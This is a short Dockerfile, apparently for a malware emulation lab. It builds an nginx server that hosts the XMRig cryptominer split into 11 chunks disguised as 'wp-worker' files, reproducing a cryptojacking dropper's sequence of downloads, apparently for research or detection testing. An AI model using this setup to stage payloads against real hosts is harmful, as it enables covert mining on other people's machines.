FROM nginx:alpine
ARG XMRIG_VER=6.22.2
# Build-time only: fetch official static XMRig and split into 11 parts named
# wp-worker.part1..part11 to reproduce the dropper's 11 sequential GETs.
ADD https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VER}/xmrig-${XMRIG_VER}-linux-static-x64.tar.gz /tmp/x.tgz
RUN set -eu; \
    apk add --no-cache coreutils; \
    tar xzf /tmp/x.tgz -C /tmp; \
    BIN="$(find /tmp -type f -name xmrig | head -1)"; \
    test -n "$BIN"; \
    cd /usr/share/nginx/html; \
    split -n 11 -d "$BIN" part_; \
    i=1; for n in 00 01 02 03 04 05 06 07 08 09 10; do mv "part_$n" "wp-worker.part$i"; i=$((i+1)); done; \
    rm -rf /tmp/x.tgz /tmp/xmrig*; \
    test "$(ls wp-worker.part* | wc -l)" -eq 11; \
    ls -la /usr/share/nginx/html
